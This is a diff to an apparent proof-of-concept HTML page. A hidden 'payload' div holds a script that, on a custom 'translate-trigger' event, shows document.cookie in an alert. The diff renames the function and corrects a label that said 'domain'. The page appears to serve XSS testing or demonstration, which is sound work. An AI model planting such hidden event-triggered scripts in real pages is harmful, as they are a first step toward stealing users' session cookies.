@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -14,12 +13,12 @@
     <div id="payload-container" style="display: none;">
         <div id="payload">
             <script>
-                // Function to show document.domain
-                function showDomain() {
-                    alert('Document domain: ' + document.cookie);
+                // Function to show document.cookie
+                function showCookie() {
+                    alert('Document cookie: ' + document.cookie);
                 }
                 // Attach event listener to trigger payload
-                document.addEventListener('translate-trigger', showDomain);
+                document.addEventListener('translate-trigger', showCookie);
             </script>
         </div>
     </div>
